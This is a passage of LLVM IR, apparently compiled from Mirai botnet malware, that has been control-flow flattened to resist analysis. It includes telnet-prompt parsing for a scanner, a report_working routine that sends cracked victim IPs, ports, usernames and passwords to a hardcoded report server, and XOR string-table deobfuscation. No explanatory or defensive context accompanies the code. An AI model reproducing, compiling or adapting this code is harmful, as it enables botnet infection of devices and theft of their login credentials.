  %56 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %57 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %56, i32 0, i32 7
  %58 = load i32, i32* %5, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [256 x i8], [256 x i8]* %57, i64 0, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp eq i32 %62, 37
  %64 = select i1 %63, i32 71172090, i32 -1408983188
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %5, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %6, align 4
  store i32 1321940432, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 141910662, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, -1
  store i32 %71, i32* %5, align 4
  store i32 -152606953, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %6, align 4
  %74 = icmp eq i32 %73, -1
  %75 = select i1 %74, i32 2121315148, i32 1633606645
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1067526966, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %6, align 4
  store i32 %78, i32* %2, align 4
  store i32 1067526966, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %2, align 4
  ret i32 %80

loopEnd:                                          ; preds = %77, %76, %72, %69, %68, %65, %55, %45, %35, %25, %15, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 10, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1465010172, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1465010172, label %first
    i32 1575724620, label %20
    i32 -196189595, label %21
    i32 779434132, label %36
    i32 1372502555, label %37
    i32 511059023, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp ne i32 %.reload, -1
  %19 = select i1 %18, i32 1575724620, i32 -196189595
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  store i32 511059023, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %22 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %22, i8** %4, align 8
  %23 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %24 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %23, i32 0, i32 7
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %24, i32 0, i32 0
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 6
  %28 = load i32, i32* %27, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %6, align 4
  %31 = sub nsw i32 %30, 1
  %32 = call i32 @util_memsearch(i8* %25, i32 %28, i8* %29, i32 %31)
  store i32 %32, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %33 = load i32, i32* %5, align 4
  %34 = icmp eq i32 %33, -1
  %35 = select i1 %34, i32 779434132, i32 1372502555
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 511059023, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %5, align 4
  store i32 %38, i32* %2, align 4
  store i32 511059023, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  ret i32 %40

loopEnd:                                          ; preds = %37, %36, %21, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1711315537, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1711315537, label %first
    i32 -720308878, label %16
    i32 -1260350033, label %20
    i32 -1015906801, label %21
    i32 1586877019, label %25
    i32 1003679960, label %26
    i32 1050462057, label %43
    i32 -1262365240, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 -1260350033, i32 -720308878
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %8, align 4
  %18 = icmp eq i32 %17, -1
  %19 = select i1 %18, i32 -1260350033, i32 -1015906801
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  ret void

; <label>:21:                                     ; preds = %loopEntry
  %22 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %22, i32* %9, align 4
  %23 = icmp eq i32 %22, -1
  %24 = select i1 %23, i32 1586877019, i32 1003679960
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

; <label>:26:                                     ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 2)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i32 0, i32 0)) #6
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %30 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %29, i32 0, i32 0
  store i32 %28, i32* %30, align 4
  %31 = call i8* @table_retrieve_val(i32 2, i32* null)
  %32 = bitcast i8* %31 to i16*
  %33 = load i16, i16* %32, align 2
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  call void @table_lock_val(i8 zeroext 2)
  %35 = load i32, i32* %9, align 4
  %36 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %37 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %37, %struct.sockaddr** %36, align 8
  %38 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %39 = load %struct.sockaddr*, %struct.sockaddr** %38, align 8
  %40 = call i32 @connect(i32 %35, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  %42 = select i1 %41, i32 1050462057, i32 -1262365240
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %9, align 4
  %45 = call i32 @close(i32 %44)
  call void @exit(i32 0) #8
  unreachable

; <label>:46:                                     ; preds = %loopEntry
  store i8 0, i8* %11, align 1
  %47 = load i32, i32* %9, align 4
  %48 = call i64 @send(i32 %47, i8* %11, i64 1, i32 16384)
  %49 = load i32, i32* %9, align 4
  %50 = bitcast i32* %4 to i8*
  %51 = call i64 @send(i32 %49, i8* %50, i64 4, i32 16384)
  %52 = load i32, i32* %9, align 4
  %53 = bitcast i16* %5 to i8*
  %54 = call i64 @send(i32 %52, i8* %53, i64 2, i32 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 4
  %58 = call i64 @send(i32 %55, i8* %57, i64 1, i32 16384)
  %59 = load i32, i32* %9, align 4
  %60 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 0
  %62 = load i8*, i8** %61, align 8
  %63 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %64 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %63, i32 0, i32 4
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i64
  %67 = call i64 @send(i32 %59, i8* %62, i64 %66, i32 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 5
  %71 = call i64 @send(i32 %68, i8* %70, i64 1, i32 16384)
  %72 = load i32, i32* %9, align 4
  %73 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %74 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %73, i32 0, i32 1
  %75 = load i8*, i8** %74, align 8
  %76 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %77 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %76, i32 0, i32 5
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i64
  %80 = call i64 @send(i32 %72, i8* %75, i64 %79, i32 16384)
  %81 = load i32, i32* %9, align 4
  %82 = call i32 @close(i32 %81)
  call void @exit(i32 0) #8
  unreachable

loopEnd:                                          ; preds = %26, %21, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #6
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* %15, i8* %16, i32 %19)
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -2123733748, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2123733748, label %20
    i32 1118616540, label %26
    i32 -445344602, label %59
    i32 1803497258, label %62
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = load i32*, i32** %4, align 8
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %21, %23
  %25 = select i1 %24, i32 1118616540, i32 1803497258
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %6, align 8
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = xor i32 %32, 222
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %30, align 1
  %35 = load i8*, i8** %6, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = xor i32 %40, 222
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %38, align 1
  %43 = load i8*, i8** %6, align 8
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = xor i32 %48, 251
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %46, align 1
  %51 = load i8*, i8** %6, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, 175
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  store i32 -445344602, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %5, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %5, align 4
  store i32 -2123733748, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %6, align 8
  ret i8* %63

loopEnd:                                          ; preds = %59, %26, %20, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 2144701793, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2144701793, label %27
    i32 1798566735, label %35
    i32 -117896777, label %84
    i32 999798280, label %87
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  %34 = select i1 %33, i32 1798566735, i32 999798280
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i32
  %38 = load %struct.table_value*, %struct.table_value** %4, align 8
  %39 = getelementptr inbounds %struct.table_value, %struct.table_value* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = load i32, i32* %3, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = xor i32 %45, %37
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %43, align 1
  %48 = load i8, i8* %6, align 1
  %49 = zext i8 %48 to i32
  %50 = load %struct.table_value*, %struct.table_value** %4, align 8
  %51 = getelementptr inbounds %struct.table_value, %struct.table_value* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = xor i32 %57, %49
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %55, align 1
  %60 = load i8, i8* %7, align 1
  %61 = zext i8 %60 to i32
  %62 = load %struct.table_value*, %struct.table_value** %4, align 8
  %63 = getelementptr inbounds %struct.table_value, %struct.table_value* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = xor i32 %69, %61
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %67, align 1
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i32
  %74 = load %struct.table_value*, %struct.table_value** %4, align 8
  %75 = getelementptr inbounds %struct.table_value, %struct.table_value* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = xor i32 %81, %73
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %79, align 1
  store i32 -117896777, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %3, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %3, align 4
  store i32 2144701793, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %84, %35, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %.reg2mem = alloca i32*
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  store i32* %9, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 763297563, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 763297563, label %first
    i32 1393279504, label %12
    i32 -2011193685, label %18
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %10 = icmp ne i32* %.reload, null
  %11 = select i1 %10, i32 1393279504, i32 -2011193685
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load %struct.table_value*, %struct.table_value** %5, align 8
  %14 = getelementptr inbounds %struct.table_value, %struct.table_value* %13, i32 0, i32 1
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = load i32*, i32** %4, align 8
  store i32 %16, i32* %17, align 4
  store i32 -2011193685, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.table_value*, %struct.table_value** %5, align 8
  %20 = getelementptr inbounds %struct.table_value, %struct.table_value* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  ret i8* %21

loopEnd:                                          ; preds = %12, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  store i32 %12, i32* %.reg2mem
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -1700985536, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1700985536, label %first
    i32 -1394367240, label %16
    i32 -1013937559, label %17
    i32 1926916017, label %18
    i32 -1783283637, label %23
    i32 -384750358, label %38
    i32 -566292038, label %44
    i32 1594955735, label %47
    i32 700254986, label %48
    i32 -1658356351, label %49
    i32 2131639640, label %50
    i32 -1204049781, label %53
    i32 125741580, label %54
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %14 = icmp sgt i32 %.reload, %.reload3
  %15 = select i1 %14, i32 -1394367240, i32 -1013937559
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 125741580, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 1926916017, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %10, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp slt i32 %19, %20
  %22 = select i1 %21, i32 -1783283637, i32 -1204049781
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8*, i8** %6, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8*, i8** %8, align 8
  %31 = load i32, i32* %11, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %29, %35
  %37 = select i1 %36, i32 -384750358, i32 700254986
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %40, %41
  %43 = select i1 %42, i32 -566292038, i32 1594955735
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %10, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  store i32 125741580, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -1658356351, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1658356351, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 2131639640, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %10, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %10, align 4
  store i32 1926916017, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 125741580, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %5, align 4
  ret i32 %55

loopEnd:                                          ; preds = %53, %50, %49, %48, %47, %44, %38, %23, %18, %17, %16, %first, %switchDefault
  br label %loopEntry
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
